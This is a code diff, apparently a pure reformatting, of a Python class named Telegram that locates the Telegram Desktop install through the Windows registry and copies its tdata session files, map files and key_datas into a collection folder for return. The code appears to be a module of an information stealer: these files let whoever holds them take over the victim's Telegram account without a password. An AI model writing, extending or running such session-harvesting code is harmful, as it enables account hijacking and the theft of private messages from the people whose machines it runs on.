@@ -11,8 +11,8 @@ class Telegram:
     """
     Collects sessions from the Telegram.
     """
-    def __init__(self, folder: str):
 
+    def __init__(self, folder: str):
         self.__folder = folder
         self.__config = TelegramConfig()
         self.__storage = MemoryStorage()
@@ -31,10 +31,12 @@ class Telegram:
             return self.__config.SessionsPath
 
         try:
-            key = OpenKey(HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Uninstall")
+            key = OpenKey(
+                HKEY_CURRENT_USER,
+                r"Software\Microsoft\Windows\CurrentVersion\Uninstall",
+            )
 
             for i in range(QueryInfoKey(key)[0]):
-
                 subkey_name = EnumKey(key, i)
                 subkey = OpenKey(key, subkey_name)
 
@@ -68,7 +70,10 @@ class Telegram:
             return
 
         telegram_data = path.join(telegram_path, "tdata")
-        sessions = sum([findall(r"D877F783D5D3EF8C.*", file) for file in listdir(telegram_data)], [])
+        sessions = sum(
+            [findall(r"D877F783D5D3EF8C.*", file) for file in listdir(telegram_data)],
+            [],
+        )
 
         if not sessions:
             return
@@ -77,21 +82,25 @@ class Telegram:
 
         for session in sessions:
             self.__storage.add_from_disk(
-                path.join(telegram_data, session),
-                path.join(self.__folder, session)
+                path.join(telegram_data, session), path.join(self.__folder, session)
             )
 
-        maps = sum([findall(r"map.*", file) for file in listdir(path.join(telegram_data, "D877F783D5D3EF8C"))], [])
+        maps = sum(
+            [
+                findall(r"map.*", file)
+                for file in listdir(path.join(telegram_data, "D877F783D5D3EF8C"))
+            ],
+            [],
+        )
 
         for map in maps:
             self.__storage.add_from_disk(
                 path.join(telegram_data, "D877F783D5D3EF8C", map),
-                path.join(self.__folder, "D877F783D5D3EF8C", map)
+                path.join(self.__folder, "D877F783D5D3EF8C", map),
             )
 
         self.__storage.add_from_disk(
-            path.join(telegram_data, "key_datas"),
-            path.join(self.__folder, "key_datas")
+            path.join(telegram_data, "key_datas"), path.join(self.__folder, "key_datas")
         )
 
     def run(self) -> List:
@@ -105,7 +114,6 @@ class Telegram:
         - None.
         """
         try:
-
             self.__get_sessions()
 
             return self.__storage.get_data()
